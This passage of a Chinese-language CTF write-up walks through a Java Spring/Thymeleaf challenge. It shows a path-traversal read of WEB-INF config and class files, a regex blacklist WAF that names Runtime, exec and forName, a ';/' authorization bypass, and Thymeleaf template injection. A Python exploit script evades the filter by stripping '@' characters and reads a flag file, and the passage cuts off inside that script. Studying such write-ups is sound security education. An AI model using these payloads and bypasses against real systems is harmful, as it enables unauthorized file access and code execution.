<span class="tag">&lt;<span class="name">param-name</span>&gt;</span>encoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>forceEncoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>encodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>safeFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.ctf.util.SafeFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>safeFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>shiroFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.DelegatingFilterProxy<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>targetFilterLifecycle<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>shiroFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">error-page</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">error-code</span>&gt;</span>500<span class="tag">&lt;/<span class="name">error-code</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">location</span>&gt;</span>/error.jsp<span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">error-page</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">error-page</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">error-code</span>&gt;</span>404<span class="tag">&lt;/<span class="name">error-code</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">location</span>&gt;</span>/hacker.jsp<span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">error-page</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">error-page</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">error-code</span>&gt;</span>403<span class="tag">&lt;/<span class="name">error-code</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">location</span>&gt;</span>/hacker.jsp<span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">error-page</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p>依次读取class文件：<br><a target="_blank" rel="noopener" href="http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/com/ctf/util/SafeFilter.class">http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/com/ctf/util/SafeFilter.class</a></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctf.util;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Enumeration;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Matcher;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.Filter;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.FilterChain;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.FilterConfig;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SafeFilter</span></span></span><br><span class="line"><span class="class">  <span class="keyword">implements</span> <span class="title">Filter</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> String encoding = <span class="string">&quot;UTF-8&quot;</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> String[] blacklists = &#123; <span class="string">&quot;java.+lang&quot;</span>, <span class="string">&quot;Runtime|Process|byte|OutputStream|session|\&quot;|&#x27;&quot;</span>, <span class="string">&quot;exec.*\\(&quot;</span>, <span class="string">&quot;write|read&quot;</span>, <span class="string">&quot;invoke.*\\(&quot;</span>, <span class="string">&quot;\\.forName.*\\(&quot;</span>, <span class="string">&quot;lookup.*\\(&quot;</span>, <span class="string">&quot;\\.getMethod.*\\(&quot;</span>, <span class="string">&quot;javax.+script.+ScriptEngineManager&quot;</span>, <span class="string">&quot;com.+fasterxml&quot;</span>, <span class="string">&quot;org.+apache&quot;</span>, <span class="string">&quot;org.+hibernate&quot;</span>, <span class="string">&quot;org.+thymeleaf&quot;</span>, <span class="string">&quot;javassist&quot;</span>, <span class="string">&quot;javax\\.&quot;</span>, <span class="string">&quot;eval.*\\(&quot;</span>, <span class="string">&quot;\\.getClass\\(&quot;</span>, <span class="string">&quot;org.+springframework&quot;</span>, <span class="string">&quot;javax.+el&quot;</span>, <span class="string">&quot;java.+io&quot;</span> &#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig arg0)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> ServletException</span></span><br><span class="line"><span class="function">  </span>&#123;&#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain filterChain)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException, ServletException</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    request.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">    response.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">    Enumeration pNames = request.getParameterNames();</span><br><span class="line">    <span class="keyword">while</span> (pNames.hasMoreElements())</span><br><span class="line">    &#123;</span><br><span class="line">      String name = (String)pNames.nextElement();</span><br><span class="line">      String value = request.getParameter(name);</span><br><span class="line">      <span class="keyword">for</span> (String blacklist : blacklists)</span><br><span class="line">      &#123;</span><br><span class="line">        Matcher matcher = Pattern.compile(blacklist, <span class="number">34</span>).matcher(value);</span><br><span class="line">        <span class="keyword">if</span> (matcher.find())</span><br><span class="line">        &#123;</span><br><span class="line">          HttpServletResponse servletResponse = (HttpServletResponse)response;</span><br><span class="line">          servletResponse.sendError(<span class="number">403</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    filterChain.doFilter(request, response);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后其他的被waf过滤了<br>读取web.xml中的其他配置文件</p>
<p><a target="_blank" rel="noopener" href="http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/spring-core.xml">http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/spring-core.xml</a></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:p</span>=<span class="string">&quot;http://www.springframework.org/schema/p&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:aop</span>=<span class="string">&quot;http://www.springframework.org/schema/aop&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:jee</span>=<span class="string">&quot;http://www.springframework.org/schema/jee&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:tx</span>=<span class="string">&quot;http://www.springframework.org/schema/tx&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-4.0.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-4.0.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.0.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">http://www.springframework.org/schema/jee http://www.springframework.org/schema/jee/spring-jee-4.0.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx-4.0.xsd&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">import</span> <span class="attr">resource</span>=<span class="string">&quot;classpath:spring-shiro.xml&quot;</span> /&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 声明自动为spring容器中那些配置@Aspectj切面的bean创建代理，织入切面 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">aop:aspectj-autoproxy</span>&gt;</span><span class="tag">&lt;/<span class="name">aop:aspectj-autoproxy</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 支持事物注解（@Transactional） --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tx:annotation-driven</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;viewResolver&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.thymeleaf.spring4.view.ThymeleafViewResolver&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;order&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;characterEncoding&quot;</span> <span class="attr">value</span>=<span class="string">&quot;UTF-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;templateEngine&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;templateEngine&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;templateEngine&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.thymeleaf.spring4.SpringTemplateEngine&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;templateResolver&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;templateResolver&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;templateResolver&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.thymeleaf.spring4.templateresolver.SpringResourceTemplateResolver&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;prefix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;/WEB-INF/templates/&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;suffix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;.html&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;templateMode&quot;</span> <span class="attr">value</span>=<span class="string">&quot;HTML5&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;cacheable&quot;</span> <span class="attr">value</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;characterEncoding&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">context:annotation-config</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.ctf&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:include-filter</span> <span class="attr">type</span>=<span class="string">&quot;annotation&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;org.springframework.stereotype.Service&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:include-filter</span> <span class="attr">type</span>=<span class="string">&quot;annotation&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;org.springframework.stereotype.Repository&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/spring-web.xml">http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/spring-web.xml</a></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:mvc</span>=<span class="string">&quot;http://www.springframework.org/schema/mvc&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc.xsd&quot;</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 自动扫描 Controller 包 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.ctf.controller&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.ctf.repository&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.ctf.service&quot;</span>/&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 注解配置和乱码处理 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">mvc:annotation-driven</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:message-converters</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.http.converter.StringHttpMessageConverter&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">value</span>=<span class="string">&quot;UTF-8&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mvc:message-converters</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">mvc:annotation-driven</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">mvc:default-servlet-handler</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>猜测他们的Auth，Login等对应的Controller类名<br><a target="_blank" rel="noopener" href="http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/com/ctf/controller/IndexController.class">http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/com/ctf/controller/IndexController.class</a></p>
<p><a target="_blank" rel="noopener" href="http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/com/ctf/controller/AuthController.class">http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/com/ctf/controller/AuthController.class</a></p>
<p>拿到Admin的路由：<code>http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef/index</code>，同样权限绕过<br>发现提示Render，盲猜又是SSTI</p>
<p>检测JAVA的SSTI发现<code>[[$&#123;7*7&#125;]]</code>成功执行，这是一个Thymeleaf 模板注入</p>
</li>
</ol>
<p>进入下一步SSTI</p>
<p>ctfFilter过滤了：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String[] blacklists = &#123; <span class="string">&quot;java.+lang&quot;</span>, <span class="string">&quot;Runtime|Process|byte|OutputStream|session|\&quot;|&#x27;&quot;</span>, <span class="string">&quot;exec.*\\(&quot;</span>, <span class="string">&quot;write|read&quot;</span>, <span class="string">&quot;invoke.*\\(&quot;</span>, <span class="string">&quot;\\.forName.*\\(&quot;</span>, <span class="string">&quot;lookup.*\\(&quot;</span>, <span class="string">&quot;\\.getMethod.*\\(&quot;</span>, <span class="string">&quot;javax.+script.+ScriptEngineManager&quot;</span>, <span class="string">&quot;com.+fasterxml&quot;</span>, <span class="string">&quot;org.+apache&quot;</span>, <span class="string">&quot;org.+hibernate&quot;</span>, <span class="string">&quot;org.+thymeleaf&quot;</span>, <span class="string">&quot;javassist&quot;</span>, <span class="string">&quot;javax\\.&quot;</span>, <span class="string">&quot;eval.*\\(&quot;</span>, <span class="string">&quot;\\.getClass\\(&quot;</span>, <span class="string">&quot;org.+springframework&quot;</span>, <span class="string">&quot;javax.+el&quot;</span>, <span class="string">&quot;java.+io&quot;</span> &#125;;</span><br></pre></td></tr></table></figure>

<p>利用Thymeleaf 特性绕过</p>
<p><code>[[*&#123;__$&#123;#strings.replace(param.foo[0],param.bbb[0],param.t[0])&#125;__&#125;]]</code></p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> gen</span><br><span class="line"><span class="comment">#  private static String[] blacklists = &#123; &quot;java.+lang&quot;, &quot;Runtime|Process|byte|OutputStream|session|\&quot;|&#x27;&quot;, &quot;exec.*\\(&quot;, &quot;write|read&quot;, &quot;invoke.*\\(&quot;, &quot;\\.forName.*\\(&quot;, </span></span><br><span class="line"><span class="comment"># &quot;lookup.*\\(&quot;, &quot;\\.getMethod.*\\(&quot;, </span></span><br><span class="line"><span class="comment"># &quot;javax.+script.+ScriptEngineManager&quot;, &quot;com.+fasterxml&quot;, &quot;org.+apache&quot;, &quot;org.+hibernate&quot;, &quot;org.+thymeleaf&quot;, &quot;javassist&quot;, &quot;javax\\.&quot;, &quot;eval.*\\(&quot;, &quot;\\.getClass\\(&quot;,</span></span><br><span class="line"><span class="comment">#  &quot;org.+springframework&quot;, &quot;javax.+el&quot;, &quot;java.+io&quot; &#125;;</span></span><br><span class="line"></span><br><span class="line">code = <span class="string">&quot;param.foo&quot;</span></span><br><span class="line">payload =<span class="string">&#x27;&#x27;&#x27;&lt;p th:text=$&#123;%s&#125;&gt;&lt;/p&gt;&#x27;&#x27;&#x27;</span>%code</span><br><span class="line">cmd=payload</span><br><span class="line">cmd=<span class="string">&quot;&quot;&quot;[[*&#123;__$&#123;#strings.replace(param.foo[0],param.bbb[0],param.t[0])&#125;__&#125;]] &quot;&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(cmd)</span><br><span class="line">burp0_url = <span class="string">&quot;http://116.85.37.131:80/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef/customize&quot;</span></span><br><span class="line">burp0_headers = &#123;<span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://116.85.37.131&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef/index&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">burp0_data = &#123;<span class="string">&quot;content&quot;</span>: cmd&#125;</span><br><span class="line">response=requests.post(burp0_url, headers=burp0_headers, data=burp0_data).text</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    redirect = re.search(<span class="string">&#x27;fetch \./(.*) !&#x27;</span>, response).group(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">except</span> :</span><br><span class="line">    <span class="built_in">print</span>(response)</span><br><span class="line">url = <span class="string">&#x27;http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef/&#x27;</span></span><br><span class="line">url += redirect</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(requests.get(url,params=&#123;<span class="string">&quot;foo&quot;</span>:<span class="string">&quot;NEW java.util.Scanner(NEW java.i@o.BufferedRea@der(new java.i@o.Fi@leRe@ad@er(new java.i@o.Fi@le(&quot;</span>+gen.gen(<span class="string">&quot;/flag_is_here&quot;</span>)+<span class="string">&quot;)))).nextLine()&quot;</span>,<span class="string">&quot;bbb&quot;</span>:<span class="string">&#x27;@&#x27;</span>,<span class="string">&quot;t&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&#x27;g&#x27;</span>:<span 